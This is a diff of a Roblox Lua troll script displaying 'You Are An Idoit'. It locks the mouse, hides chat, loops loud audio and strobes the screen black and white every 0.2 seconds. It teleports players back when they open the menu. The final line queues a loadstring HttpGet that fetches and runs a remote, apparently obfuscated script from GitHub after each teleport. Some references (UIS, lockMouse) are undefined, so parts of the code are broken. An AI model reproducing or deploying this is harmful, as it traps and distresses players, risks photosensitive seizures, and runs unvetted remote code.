@@ -9,149 +9,172 @@ local CHAT_REENABLE_DELAY = 9999999999 -- delay before chat shows again (in seco
 
 --// Player
 local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
 
---// ===== Mouse Lock + Hide =====
-local function enableMouseLock()
-	pcall(function()
-		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
-		UserInputService.MouseIconEnabled = false
-	end)
-end
+-- Function to initialize the script each time character loads
+local function initCharacter(char)
+	task.wait(0.2)
+	
+	local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
+	local playerGui = player:WaitForChild("PlayerGui")
 
-local function disableMouseLock()
-	pcall(function()
-		UserInputService.MouseBehavior = Enum.MouseBehavior.Default
-		UserInputService.MouseIconEnabled = true
-	end)
-end
+	--// ===== Mouse Lock + Hide =====
+	local function enableMouseLock()
+		pcall(function()
+			UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
+			UserInputService.MouseIconEnabled = false
+		end)
+	end
 
-enableMouseLock()
-player.CharacterAdded:Connect(function()
-	task.wait(0.1)
 	enableMouseLock()
-end)
 
---// ===== Hide Chat and Core UI (temporary) =====
-local function hideCoreUI()
-	pcall(function()
-		StarterGui:SetCore("ChatActive", false)
-		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+	-- Ensure mouse stays locked after respawn
+	player.CharacterAdded:Connect(function()
+		task.wait(0.1)
+		enableMouseLock()
 	end)
-end
 
-local function showCoreUI()
-	pcall(function()
-		StarterGui:SetCore("ChatActive", true)
-		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+	--// ===== Hide Chat and Core UI =====
+	local function hideCoreUI()
+		pcall(function()
+			StarterGui:SetCore("ChatActive", false)
+			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+		end)
+	end
+
+	local function showCoreUI()
+		pcall(function()
+			StarterGui:SetCore("ChatActive", true)
+			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+		end)
+	end
+
+	hideCoreUI()
+	task.spawn(function()
+		task.wait(CHAT_REENABLE_DELAY)
+		showCoreUI()
 	end)
-end
 
--- Hide chat/UI at start
-hideCoreUI()
+	--// ===== Sound =====
+	local existingSound = humanoidRootPart:FindFirstChild("IdiotSound")
+	if existingSound then existingSound:Destroy() end
 
--- Re-enable chat after delay
-task.spawn(function()
-	task.wait(CHAT_REENABLE_DELAY)
-	showCoreUI()
-end)
+	local sound = Instance.new("Sound")
+	sound.Name = "IdiotSound"
+	sound.SoundId = "rbxassetid://3200130016"
+	sound.Volume = 10
+	sound.Looped = true
+	sound.Parent = humanoidRootPart
+	sound:Play()
 
---// ===== Sound =====
-local sound = Instance.new("Sound")
-sound.SoundId = "rbxassetid://3200130016"
-sound.Volume = 10
-sound.Looped = true
-sound.Parent = humanoidRootPart
-sound:Play()
+	--// ===== GUI =====
+	local existingGui = playerGui:FindFirstChild("IdiotGUI")
+	if existingGui then existingGui:Destroy() end
 
---// ===== White Screen Overlay =====
-local screenGui = Instance.new("ScreenGui")
-screenGui.ResetOnSpawn = false
-screenGui.Parent = playerGui
+	local screenGui = Instance.new("ScreenGui")
+	screenGui.Name = "IdiotGUI"
+	screenGui.ResetOnSpawn = false
+	screenGui.Parent = playerGui
 
-local whiteFrame = Instance.new("Frame")
-whiteFrame.BackgroundColor3 = Color3.new(1,1,1)
-whiteFrame.Size = UDim2.new(1, 0, 1.5, 0)
-whiteFrame.Position = UDim2.new(0, 0, -0.25, 0)
-whiteFrame.Parent = screenGui
+	local whiteFrame = Instance.new("Frame")
+	whiteFrame.BackgroundColor3 = Color3.new(1,1,1)
+	whiteFrame.Size = UDim2.new(1, 0, 1.5, 0)
+	whiteFrame.Position = UDim2.new(0, 0, -0.25, 0)
+	whiteFrame.Parent = screenGui
 
---// ===== "You Are An Idoit" Text =====
-local titleText = Instance.new("TextLabel")
-titleText.Text = "You Are An Idoit"
-titleText.Font = Enum.Font.Arcade
-titleText.TextScaled = true
-titleText.TextColor3 = Color3.new(0, 0, 0)
-titleText.BackgroundTransparency = 1
-titleText.Size = UDim2.new(1, 0, 0.2, 0)
-titleText.Position = UDim2.new(0, 0, 0.05, 0)
-titleText.TextStrokeTransparency = 0
-titleText.TextStrokeColor3 = Color3.new(1, 1, 1)
-titleText.Parent = screenGui
+	local titleText = Instance.new("TextLabel")
+	titleText.Text = "You Are An Idoit"
+	titleText.Font = Enum.Font.Arcade
+	titleText.TextScaled = true
+	titleText.TextColor3 = Color3.new(0, 0, 0)
+	titleText.BackgroundTransparency = 1
+	titleText.Size = UDim2.new(1, 0, 0.2, 0)
+	titleText.Position = UDim2.new(0, 0, 0.05, 0)
+	titleText.TextStrokeTransparency = 0
+	titleText.TextStrokeColor3 = Color3.new(1, 1, 1)
+	titleText.Parent = screenGui
 
---// ☻ Faces Setup
-local positions = {
-	UDim2.new(0.1, 0, 0.5, 0),
-	UDim2.new(0.5, 0, 0.5, 0),
-	UDim2.new(0.9, 0, 0.5, 0)
-}
+	-- ☻ Faces Setup
+	local positions = {
+		UDim2.new(0.1, 0, 0.5, 0),
+		UDim2.new(0.5, 0, 0.5, 0),
+		UDim2.new(0.9, 0, 0.5, 0)
+	}
 
-local faces = {}
+	local faces = {}
+	for _, pos in ipairs(positions) do
+		local faceLabel = Instance.new("TextLabel")
+		faceLabel.Text = "☺"
+		faceLabel.Font = Enum.Font.Cartoon
+		faceLabel.TextSize = 3000
+		faceLabel.TextColor3 = Color3.new(0,0,0)
+		faceLabel.BackgroundTransparency = 1
+		faceLabel.Size = UDim2.new(0, 3000, 0, 3000)
+		faceLabel.Position = pos
+		faceLabel.AnchorPoint = Vector2.new(0.5,0.5)
+		faceLabel.TextScaled = false
+		faceLabel.Parent = screenGui
 
-for _, pos in ipairs(positions) do
-	local faceLabel = Instance.new("TextLabel")
-	faceLabel.Text = "☺"
-	faceLabel.Font = Enum.Font.Cartoon
-	faceLabel.TextSize = 3000
-	faceLabel.TextColor3 = Color3.new(0,0,0)
-	faceLabel.BackgroundTransparency = 1
-	faceLabel.Size = UDim2.new(0, 3000, 0, 3000)
-	faceLabel.Position = pos
-	faceLabel.AnchorPoint = Vector2.new(0.5,0.5)
-	faceLabel.TextScaled = false
-	faceLabel.Parent = screenGui
+		table.insert(faces, faceLabel)
 
-	table.insert(faces, faceLabel)
+		local originalPos = faceLabel.Position
+		RunService.RenderStepped:Connect(function()
+			local offsetX = math.random(-5,5)/100
+			local offsetY = math.random(-5,5)/100
+			faceLabel.Position = originalPos + UDim2.new(0, offsetX, 0, offsetY)
+		end)
+	end
 
-	local originalPos = faceLabel.Position
-	RunService.RenderStepped:Connect(function()
-		local offsetX = math.random(-5,5)/100
-		local offsetY = math.random(-5,5)/100
-		faceLabel.Position = originalPos + UDim2.new(0, offsetX, 0, offsetY)
-	end)
-end
+	-- ☻ Faces Flash Effect
+	local faceFlashInterval = 0.2
+	local faceFlashTimer = 0
 
---// ☻ Faces Flash Effect
-local faceFlashInterval = 0.2
-local faceFlashTimer = 0
-
-RunService.RenderStepped:Connect(function(dt)
-	faceFlashTimer = faceFlashTimer + dt
-	if faceFlashTimer >= faceFlashInterval then
-		faceFlashTimer = 0
-		for _, face in ipairs(faces) do
-			if face.TextColor3 == Color3.new(0,0,0) then
-				face.TextColor3 = Color3.new(1,1,1)
-			else
-				face.TextColor3 = Color3.new(0,0,0)
+	RunService.RenderStepped:Connect(function(dt)
+		faceFlashTimer = faceFlashTimer + dt
+		if faceFlashTimer >= faceFlashInterval then
+			faceFlashTimer = 0
+			for _, face in ipairs(faces) do
+				if face.TextColor3 == Color3.new(0,0,0) then
+					face.TextColor3 = Color3.new(1,1,1)
+				else
+					face.TextColor3 = Color3.new(0,0,0)
+				end
 			end
 		end
-	end
-end)
+	end)
 
---// White Screen Flash
-local screenFlashInterval = 0.2
-local screenFlashTimer = 0
+	-- White Screen Flash
+	local screenFlashInterval = 0.2
+	local screenFlashTimer = 0
 
-RunService.RenderStepped:Connect(function(dt)
-	screenFlashTimer = screenFlashTimer + dt
-	if screenFlashTimer >= screenFlashInterval then
-		screenFlashTimer = 0
-		if whiteFrame.BackgroundColor3 == Color3.new(1,1,1) then
-			whiteFrame.BackgroundColor3 = Color3.new(0,0,0)
-		else
-			whiteFrame.BackgroundColor3 = Color3.new(1,1,1)
+	RunService.RenderStepped:Connect(function(dt)
+		screenFlashTimer = screenFlashTimer + dt
+		if screenFlashTimer >= screenFlashInterval then
+			screenFlashTimer = 0
+			if whiteFrame.BackgroundColor3 == Color3.new(1,1,1) then
+				whiteFrame.BackgroundColor3 = Color3.new(0,0,0)
+			else
+				whiteFrame.BackgroundColor3 = Color3.new(1,1,1)
+			end
 		end
+	end)
+end
+
+-- Run once now, and again whenever player respawns
+if player.Character then
+	initCharacter(player.Character)
+end
+
+player.CharacterAdded:Connect(initCharacter)
+
+game:GetService("GuiService").MenuOpened:Connect(function() 
+	game:GetService("TeleportService"):Teleport(game.PlaceId) 
+end)
+
+-- Detect ESC
+UIS.InputBegan:Connect(function(input, processed)
+	if input.KeyCode == Enum.KeyCode.Escape then
+		lockMouse()
 	end
 end)
+
+queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Executioner11/Best-Script-/refs/heads/main/--%5B%5B%20v1.0.0%20httpswearedevs.netobfus.txt"))()')
